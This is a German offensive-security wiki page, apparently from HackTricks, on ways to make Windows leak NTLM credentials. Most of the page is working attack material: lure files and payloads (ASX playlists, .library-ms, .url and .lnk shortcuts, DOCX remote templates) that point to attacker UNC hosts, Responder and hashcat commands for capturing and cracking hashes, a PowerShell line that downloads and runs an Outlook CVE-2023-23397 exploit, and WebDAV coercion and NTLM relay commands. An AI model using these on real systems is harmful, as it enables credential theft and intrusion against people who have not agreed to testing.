# Orte zum Stehlen von NTLM-Credentials

{{#include ../../banners/hacktricks-training.md}}

**Prüfe all die großartigen Ideen von [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) – vom Download einer Microsoft-Word-Datei online bis zur Quelle der NTLM-leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md und [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Beschreibbarer SMB-Share + durch Explorer ausgelöste UNC-Lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Wenn du **in einen Share schreiben kannst, den Benutzer oder geplante Jobs im Explorer durchsuchen**, lege Dateien ab, deren Metadaten auf deine UNC (z. B. `\\ATTACKER\share`) verweisen. Beim Darstellen des Ordners wird eine **implizite SMB-Authentifizierung** ausgelöst und ein **NetNTLMv2** an deinen Listener geleakt.<sup>[[1]](#references)</sup>

1. **Lures generieren** (umfasst SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/usw.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Auf der beschreibbaren Freigabe ablegen** (jeden Ordner, den das Opfer öffnet):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Mithören und cracken**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows kann mehrere Dateien gleichzeitig verarbeiten; alles, was Explorer in der Vorschau anzeigt (`BROWSE TO FOLDER`), erfordert keine Klicks.

### Windows Media Player-Wiedergabelisten (.ASX/.WAX)

Wenn du ein Ziel dazu bringen kannst, eine von dir kontrollierte Windows Media Player-Wiedergabeliste zu öffnen oder in der Vorschau anzuzeigen, kannst du Net-NTLMv2 leaken, indem du den Eintrag auf einen UNC-Pfad verweist. WMP versucht, die referenzierte Mediendatei über SMB abzurufen, und authentifiziert sich dabei implizit.<sup>[[3]](#references)[[4]](#references)</sup>

Beispiel-Payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Ablauf zur Sammlung und zum Cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### In ZIP eingebetteter .library-ms-NTLM-leak (CVE-2025-24071/24055)

Windows Explorer verarbeitet .library-ms-Dateien unsicher, wenn sie direkt aus einem ZIP-Archiv geöffnet werden. Wenn die Bibliotheksdefinition auf einen entfernten UNC-Pfad (z. B. \\attacker\share) verweist, führt bereits das Durchsuchen/Starten der .library-ms-Datei innerhalb des ZIP-Archivs dazu, dass Explorer den UNC-Pfad enumeriert und NTLM-Authentifizierungsdaten an den Angreifer sendet. Dadurch entsteht ein NetNTLMv2-Hash, der offline geknackt oder möglicherweise weitergeleitet werden kann.<sup>[[2]](#references)</sup>

Minimale .library-ms-Datei, die auf einen Angreifer-UNC-Pfad verweist
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Betriebsschritte
- Erstelle die .library-ms-Datei mit dem obigen XML (setze deine IP/hostname).
- Komprimiere sie als ZIP (unter Windows: Senden an → ZIP-komprimierter Ordner) und übermittle die ZIP-Datei an das Ziel.
- Starte einen NTLM capture listener und warte darauf, dass das Opfer die .library-ms-Datei innerhalb der ZIP öffnet.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook für Windows verarbeitete die erweiterte MAPI-Eigenschaft PidLidReminderFileParameter in calendar items. Wenn diese Eigenschaft auf einen UNC path (z. B. \\attacker\share\alert.wav) verwies, kontaktierte Outlook die SMB share, sobald die Erinnerung ausgelöst wurde, und verursachte einen leak des Net-NTLMv2 des Benutzers ohne jeglichen Klick. Dies wurde am 14. März 2023 gepatcht, ist aber für legacy/ungepatchte Umgebungen und die historische incident response weiterhin äußerst relevant.<sup>[[5]](#references)</sup>

Schnelle Ausnutzung mit PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener-Seite:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Hinweise
- Ein Opfer muss lediglich Outlook für Windows ausführen, wenn die Erinnerung ausgelöst wird.
- Der leak liefert Net‑NTLMv2, das sich für Offline-Cracking oder Relay eignet (nicht für Pass-the-Hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – Umgehung von CVE‑2025‑24054)

Windows Explorer rendert Verknüpfungssymbole automatisch. Aktuelle Forschung zeigte, dass selbst nach Microsofts Patch vom April 2025 für UNC‑icon shortcuts weiterhin eine NTLM-Authentifizierung ohne Klicks ausgelöst werden konnte, indem das Verknüpfungsziel auf einem UNC-Pfad gehostet und das Symbol lokal gehalten wurde (dieser Patch-Bypass erhielt die Bezeichnung CVE‑2025‑50154). Bereits das Anzeigen des Ordners veranlasst Explorer, Metadaten vom Remote-Ziel abzurufen, wodurch NTLM an den SMB-Server des Angreifers gesendet wird.<sup>[[6]](#references)</sup>

Minimaler Internet Shortcut-Payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Shortcut-Payload (.lnk) via PowerShell programmieren:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Zustellungsideen
- Den Shortcut in ein ZIP packen und das Opfer dazu bringen, darin zu navigieren.
- Den Shortcut auf einer beschreibbaren Freigabe ablegen, die das Opfer öffnen wird.
- Mit anderen lure files im selben Ordner kombinieren, damit Explorer eine Vorschau der Elemente anzeigt.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows lädt `.lnk`-Metadaten während der **Ansicht/Vorschau** (Icon-Darstellung), nicht nur bei der Ausführung. CVE‑2026‑25185 zeigt einen Parsing-Pfad, bei dem **ExtraData**-Blöcke die Shell dazu bringen, einen Icon-Pfad aufzulösen und **während des Ladens** auf das Dateisystem zuzugreifen, wodurch ausgehendes NTLM gesendet wird, wenn der Pfad remote ist.

Wichtige Trigger-Bedingungen (beobachtet in `CShellLink::_LoadFromStream`):
- **DARWIN_PROPS** (`0xa0000006`) in ExtraData einfügen (Gate zur Icon-Update-Routine).
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) mit befülltem **TargetUnicode** einfügen.
- Der Loader expandiert Umgebungsvariablen in `TargetUnicode` und ruft `PathFileExistsW` für den resultierenden Pfad auf.

Wenn `TargetUnicode` zu einem UNC-Pfad aufgelöst wird (z. B. `\\attacker\share\icon.ico`), verursacht bereits das bloße Anzeigen eines Ordners, der den Shortcut enthält, eine ausgehende Authentifizierung. Derselbe Ladepfad kann auch durch **Indexierung** und **AV-Scanning** ausgelöst werden, wodurch eine praktische No-click-leak-Angriffsfläche entsteht.<sup>[[7]](#references)</sup>

Research-Tooling (Parser/Generator/UI) ist im **LnkMeMaybe**-Projekt verfügbar, um diese Strukturen zu erstellen und zu untersuchen, ohne die Windows-GUI zu verwenden.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / Credential validation via davclnt.dll,DavSetCookie

Der native **WebDAV-Client** kann missbraucht werden, um die aktuelle Logon-Session zu zwingen, sich bei einem beliebigen **HTTP/WebDAV**-Endpoint zu authentifizieren:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Warum dies nützlich ist:
- Gegen einen **von einem Angreifer kontrollierten WebDAV-Server** kann dies **NTLM über HTTP** auslösen, ohne einen eigenen Client bereitzustellen.
- Gegen **interne Hosts** ist dies eine unauffällige Möglichkeit zu **validieren, wo gestohlene Zugangsdaten akzeptiert werden**, bevor man sich lateral weiterbewegt.<sup>[[9]](#references)</sup>
- Der Befehl ist eine gute Alternative, wenn **SMB-Egress gefiltert** wird, **HTTP/WebDAV** jedoch weiterhin erreichbar ist.

Operative Hinweise:
- Der **WebClient**-Dienst muss auf dem Quellhost ausgeführt werden.
- `rundll32.exe` lädt `davclnt.dll` und veranlasst Windows, die WebDAV-Authentifizierung mit den **Zugangsdaten des aktuellen Benutzers** durchzuführen.<sup>[[10]](#references)</sup>
- Wenn du auf eine von dir kontrollierte Infrastruktur verweist, verwende einen NTLM-fähigen HTTP-Listener/Relay wie:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Aus Sicht der Erkennung sind wiederholte Ausführungen von `rundll32.exe davclnt.dll,DavSetCookie` gegen viele interne Systeme ein starkes Signal für **Credential Validation / Spray-ähnliche Vorbereitung lateraler Bewegungen** und nicht für normales Benutzerverhalten.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) zum Erzwingen von NTLM

Office-Dokumente können auf ein externes Template verweisen. Wenn du das angehängte Template auf einen UNC-Pfad setzt, authentifiziert sich das Öffnen des Dokuments gegenüber SMB.

Minimale Änderungen an den DOCX-Beziehungen (innerhalb von word/):

1) Bearbeite word/settings.xml und füge die Referenz auf das angehängte Template hinzu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Bearbeite word/_rels/settings.xml.rels und verweise rId1337 auf deine UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Repack in .docx und liefere es aus. Starte deinen SMB capture listener und warte auf das Öffnen.

Ideen für die Zeit nach dem Capture zum Relaying oder Abusing von NTLM findest du hier:

{{#ref}}
README.md
{{#endref}}


## Referenzen
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
